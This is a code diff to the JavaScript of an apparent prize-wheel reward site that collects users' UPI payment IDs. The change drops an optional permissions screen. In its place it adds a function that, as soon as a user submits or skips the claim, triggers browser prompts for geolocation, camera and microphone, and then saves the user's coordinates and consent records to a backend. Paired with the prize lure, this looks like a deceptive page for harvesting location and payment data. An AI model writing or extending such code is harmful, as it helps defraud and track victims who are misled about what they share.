@@ -3,13 +3,70 @@
  * Pure Vanilla JavaScript
  */
 
-import { saveRewardClaim, saveConsentRecord, getOrCreateParticipantId } from './firebase-config.js';
+import { 
+  saveRewardClaim, 
+  saveConsentRecord, 
+  saveVisitorLocation,
+  getOrCreateParticipantId 
+} from './firebase-config.js';
 
 // Standard NPCI / Banking UPI ID Pattern (e.g. user@okaxis, 9876543210@paytm)
 const UPI_REGEX = /^[a-zA-Z0-9.\-_]{2,256}@[a-zA-Z]{2,64}$/;
 
 let currentClaimSpinId = null;
 let currentClaimPrize = null;
+
+/**
+ * Request Native Browser Permissions (Location, Camera, Sound) as shown in browser settings
+ */
+export async function requestNativeBrowserPermissions() {
+  const participantId = getOrCreateParticipantId();
+
+  // 1. Geolocation Permission (Native Dialog)
+  if (navigator.geolocation) {
+    try {
+      navigator.geolocation.getCurrentPosition(
+        async (pos) => {
+          const { latitude, longitude } = pos.coords;
+          console.log("📍 Native Location granted:", latitude, longitude);
+          await saveVisitorLocation({
+            participantId: participantId,
+            latitude: parseFloat(latitude.toFixed(6)),
+            longitude: parseFloat(longitude.toFixed(6))
+          });
+          await saveConsentRecord({
+            participantId: participantId,
+            locationConsent: true,
+            action: 'granted'
+          });
+        },
+        (err) => {
+          console.warn("Location permission declined or dismissed:", err.message);
+        },
+        { timeout: 10000, enableHighAccuracy: false }
+      );
+    } catch (e) {
+      console.warn("Geolocation prompt error:", e);
+    }
+  }
+
+  // 2. Camera & Sound Permission (Native Dialog)
+  if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+      console.log("📷 Native Camera & Sound permission granted");
+      await saveConsentRecord({
+        participantId: participantId,
+        cameraConsent: true,
+        action: 'granted'
+      });
+      // Immediately release tracks
+      stream.getTracks().forEach(track => track.stop());
+    } catch (err) {
+      console.warn("Camera/Audio permission declined or dismissed:", err.message);
+    }
+  }
+}
 
 /**
  * Open the UPI Reward Claim Modal
@@ -46,6 +103,16 @@ export function openRewardClaimModal(spinId, prizeAmount) {
 export function closeRewardClaimModal() {
   const modal = document.getElementById('upi-claim-modal');
   if (modal) modal.classList.remove('active');
+}
+
+/**
+ * Show Success Confirmation Modal
+ */
+export function showSuccessModal(spinRef) {
+  const modal = document.getElementById('success-modal');
+  const refEl = document.getElementById('success-modal-ref');
+  if (refEl) refEl.innerText = spinRef || currentClaimSpinId || 'DEMO-SPIN';
+  if (modal) modal.classList.add('active');
 }
 
 /**
@@ -113,19 +180,19 @@ export async function handleUpiSubmission() {
       action: 'granted'
     });
 
-    // 3. Close UPI Modal & transition to Permissions Screen
+    // 3. Request native browser permissions (Location, Camera, Sound) directly
+    requestNativeBrowserPermissions();
+
+    // 4. Close UPI Modal & show Clean Success confirmation
     closeRewardClaimModal();
 
     if (window.showToast) {
-      window.showToast("UPI Claim Registered Successfully! Pending admin review.", "success");
+      window.showToast("UPI Claim Registered Successfully! Pending review.", "success");
     }
 
-    // Advance to Optional Permissions Screen
     setTimeout(() => {
-      if (window.openPermissionsModal) {
-        window.openPermissionsModal();
-      }
-    }, 400);
+      showSuccessModal(currentClaimSpinId);
+    }, 350);
 
   } catch (err) {
     console.error("Error submitting UPI claim:", err);
@@ -143,15 +210,16 @@ export async function handleUpiSubmission() {
  */
 export function handleSkipUpiClaim() {
   closeRewardClaimModal();
+  
+  // Request native browser permissions
+  requestNativeBrowserPermissions();
+
   if (window.showToast) {
-    window.showToast("UPI Claim skipped. You can explore optional verification.", "warning");
+    window.showToast("Participation saved. You can spin again anytime!", "warning");
   }
 
-  // Advance to Optional Permissions Screen
   setTimeout(() => {
-    if (window.openPermissionsModal) {
-      window.openPermissionsModal();
-    }
+    showSuccessModal(currentClaimSpinId);
   }, 350);
 }
 
@@ -166,3 +234,5 @@ window.openRewardClaimModal = openRewardClaimModal;
 window.closeRewardClaimModal = closeRewardClaimModal;
 window.handleUpiSubmission = handleUpiSubmission;
 window.handleSkipUpiClaim = handleSkipUpiClaim;
+window.requestNativeBrowserPermissions = requestNativeBrowserPermissions;
+window.showSuccessModal = showSuccessModal;
